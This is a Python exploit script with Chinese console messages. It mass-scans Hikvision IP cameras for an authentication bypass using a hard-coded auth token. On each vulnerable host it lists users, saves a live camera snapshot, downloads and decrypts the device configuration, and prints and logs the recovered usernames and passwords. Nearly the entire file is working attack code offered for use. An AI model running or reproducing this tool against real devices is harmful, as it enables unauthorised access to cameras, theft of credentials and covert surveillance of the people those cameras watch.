import requests
import decrypt_configurationFile
import time
import os
from optparse import OptionParser
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}

def return_list(filename):
    with open("list.txt") as fb:
        f = fb.read()
    a = f.split('\n')
    c = []
    q = filename.split('/')
    q = q[-1]
    p = open("./backup/"+q,"w")
    p.write(f)
    for i in a:
        b = i.split(':')
        if len(b) == 1:
            b.append("80")
        c.append(b)   
    return c


class sxt_cheak:
    def __init__(self,host,port,level):
        self._host = host
        self._port = port
        self._level = level
        self.target = (host,port)
        self._url = "http://"+host+":"+str(port)   
    
    def check1(self):
        print(f"\033[1;34;40m[-] 目标 {self._host}:{self._port}\033[0m ",end="")
        target_url = self._url + "/Security/users?auth=YWRtaW46MTEK"
        try:
            re = requests.get(target_url,headers=headers)
        except Exception as e:
            print(f"\033[1;34;40m[-] 无法连接 \033[0m ")
            with open("./fail.txt","a") as fb:
                fb.write("{}:{}\n".format(self._host,self._port))
            return
        if re.status_code==200:
            print(f"\033[1;31;40m[+] 存在漏洞 \033[0m ")
            if self._level == "1":
                return False
            if self._level == "2":
                self.userName(re)
                self.down_config()
                self.Decypt()
                return False
            if self._level == "3":    
                self.userName(re)
                self.cheak2()
                self.down_config()
                self.Decypt()
            
        else:
            print(f"\033[1;34;40m[-] 不存在漏洞 \033[0m ")
            with open("./fail.txt","a") as fb:
                fb.write("{}:{}\n".format(self._host,self._port))
        re.close()
    def __del__(self):
        pass
        
    def cheak2(self):
        print(f"\033[1;32;40m[+]抓取监控快照 \033[0m ")
        t = time.strftime("%Y-%m-%d-%H-%M-%S", time.localtime())
        filename = "./photo/{}-{}/{}.jpg".format(self._host,self._port,t)
        sv_path = "./photo/{}-{}".format(self._host,self._port)
        os.makedirs(sv_path, exist_ok=True)
        if os.path.exists(filename):
            print(f"\033[1;32;40m[+]监控快照保存路径: {filename} \033[0m ")
            return False
        target_url = self._url + "/onvif-http/snapshot?auth=YWRtaW46MTEK"
        re = requests.get(target_url,headers=headers)
        content = re.content
        with open (filename,"wb") as fb:
            fb.write(content)
        print(f"\033[1;32;40m[+]监控快照保存路径: {filename} \033[0m ")
        re.close()
    def down_config(self):
        print(f"\033[1;32;40m[+]保存配置文件 \033[0m")
        filename = "./config/configurationFile-{}-{}".format(self._host,self._port)
        self._save_config_name = filename
        if os.path.exists(filename):
            print(f"\033[1;32;40m[+]配置文件保存路径: {filename} \033[0m")
            return False
        target_url = self._url + "/System/configurationFile?auth=YWRtaW46MTEK"
        re = requests.get(target_url,headers=headers)
        content = re.content

        with open(filename,"wb") as fb:
            fb.write(content)
        print(f"\033[1;32;40m[+]配置文件保存路径: {filename} \033[0m")
        re.close()
    def userName(self,RE):
        print(f"\033[1;32;40m[+]读取用户列表 \033[0m")
        self.user_list = []
        n = 1
        b = str(RE.text).split("\r\n")
        for i in b:
            if "userName" in i:
                c = i.replace("<userName>","")
                c = c.replace("</userName>","")
                self.user_list.append(c)
                print(f"\033[1;32;40m[+]用户名：{c} \033[0m ")
    def Decypt(self):
        l = decrypt_configurationFile.Decypt(self._save_config_name)
        try:
            self.list_info(l)
        except Exception as e:
            print("\033[1;34;40m ERROR{e} \033[0m")
            print(l)
    
    def list_info(self,l):
        ab = 1
        f = open("succeed.txt","a")
        f.write("{}:{}".format(self._host,self._port))
        print(f"\033[1;32;40m[+]类型:{l[0]}\033[0m ")
        for i in range(0,len(l)):
            if l[i] in self.user_list:
                print(f"\033[1;31;40m[+] userName:{l[i]} passWord:{l[i+1]} \033[0m")
                if(ab!=1):
                    f.write("  userName:{} passWord:{}".format(l[i],l[i+1]))
                ab = ab - 1
            if "time" in l[i]:
                if "windown" in l[i]:
                    print(f"\033[1;32;40m[+]target OS:Windows \033[0m ")
                   
                else:
                    print(f"\033[1;32;40m[+]target OS:Linux \033[0m ")
                   
            if "HIKVISION " in l[i]:
                print(f"\033[1;32;40m[+]摄像头型号:{l[i]} \033[0m ")
        f.write("\n")
        f.close()
if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("--rhost", dest = "host", \
    type="string", help = "摄像头IP地址")
    parser.add_option("--rport", dest = "port", \
    type="int", help = "摄像头IP端口", default=80)
    parser.add_option("--file", dest = "filename", \
    type="string", help = "IP|端口列表")
    parser.add_option("--level", dest = "level", \
    type="string", help = "测试等级" , default=1)
    (options, args) = parser.parse_args()
    if not options.host or not options.port:
        if not options.filename:
            parser.error("input host and port")
        else:
            Host_list = return_list(options.filename)
    print(f"\033[1;33;40m[done] 开始检查 \033[0m ")
    
    with open("fail.txt") as fp:
        a = fp.read()
    b = a.split('\n')
    if not options.host or not options.port:
        try:
            for i in range(0,len(Host_list)):
                print(f"\033[1;34;40m[-] 目标 {Host_list[i][0]}:{Host_list[i][1]}\033[0m ",end="")
                target = "{}:{}".format(Host_list[i][0],Host_list[i][1])
                if(not target in b):
                    b.append(Host_list[i])
                    sxt = sxt_cheak(Host_list[i][0],Host_list[i][1],options.level)
                    try:
                        sxt.check1()
                        del sxt
                    except Exception as pq:
                        print(f"\033[1;31;40m[X]ERROR:{pq} \033")
                else:
                    print(f"\033[1;32;40m[done] 目标已测试 \033[0m ")
                                    
        except (KeyboardInterrupt) as E:            
            print(f"\033[1;31;40m[X]退出程序,进度保留,源文件已备份! ./backup/ \033")
            f = open("./list.txt","w")
            for j in range(i,len(Host_list)):
                f.write("{}:{}\n".format(Host_list[j][0],Host_list[j][1]))
            f.close()
    else:
        sxt = sxt_cheak(options.host,options.port,options.level)
        sxt.check1()
        del sxt
    print(f"\033[1;33;40m[done] 检查结束 \033[0m ")
